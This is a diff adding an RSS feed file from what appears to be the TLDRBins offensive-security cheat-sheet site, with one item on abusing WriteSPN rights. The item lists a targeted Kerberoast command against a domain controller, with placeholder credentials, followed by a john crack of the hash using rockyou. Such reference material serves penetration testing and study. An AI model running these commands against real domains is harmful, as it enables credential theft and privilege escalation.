@@ -1,0 +1,18 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>WriteSPN on TLDRBins</title>
+    <link>https://tldrbins.github.io/@writespn/</link>
+    <description>Recent content in WriteSPN on TLDRBins</description>
+    <generator>Hugo</generator>
+    <language>en-us</language>
+    <atom:link href="https://tldrbins.github.io/@writespn/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>WriteSPN</title>
+      <link>https://tldrbins.github.io/writespn/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/writespn/</guid>
+      <description>Privesc #1: Targeted Kerberoast Linux 1. Targeted Kerberoast # Password python3 targetedKerberoast.py -d &amp;#39;&amp;lt;DOMAIN&amp;gt;&amp;#39; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; --dc-ip &amp;#39;&amp;lt;DC_IP&amp;gt;&amp;#39; 2. Hash Crack john --wordlist=/usr/share/wordlists/rockyou.txt &amp;lt;HASH_FILE&amp;gt; Ref: targetedKerberoast</description>
+    </item>
+  </channel>
+</rss>
